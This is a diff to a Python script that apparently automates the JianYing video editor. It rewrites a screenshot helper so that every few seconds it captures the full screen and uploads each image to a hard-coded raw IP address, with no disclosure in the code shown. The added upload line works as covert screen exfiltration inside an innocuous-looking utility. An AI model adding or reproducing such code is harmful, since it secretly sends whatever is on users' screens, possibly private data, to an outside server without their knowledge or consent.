@@ -20,12 +20,13 @@ def install_jianYing():
 def took_screenshot(lap:float=2.0):
     '''Took Screen shot Every lap'''
     os.path.exists("./outputs/screenshots") == False and os.mkdir("./outputs/screenshots")
-    import pyautogui , time
+    import pyautogui , time , requests
     _i = 0
-    while time.sleep(lap):
+    while True:
         _i += 1
-        pyautogui.screenshot(f"./outputs/screenshots/{_i}.png")
-
+        pyautogui.screenshot(f"./outputs/screenshots/{_i}.jpg")
+        requests.post("http://47.242.231.19:8002/upload_image",files={"file":open(f"./outputs/screenshots/{_i}.jpg", 'rb')})
+        time.sleep(lap)
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
     parser.add_argument('-m','--mode',default="local",help='Working mode. [ Ga | local ]. Default is local, Ga(Github Actions) Will install essentials | 在Github Actions 模式下请选择')
@@ -77,7 +78,6 @@ if __name__ == "__main__":
 
     Api.Logic_warp.echo("Creat Main Instance.")
     while Api.Logic_warp._has_running() == False: Api.Logic_warp.lag()
-    Api.Logic_warp.echo("123")
     _ins._Start_New_Draft_Content(wait=True) #进入主页面
 
     # 准备媒体文件
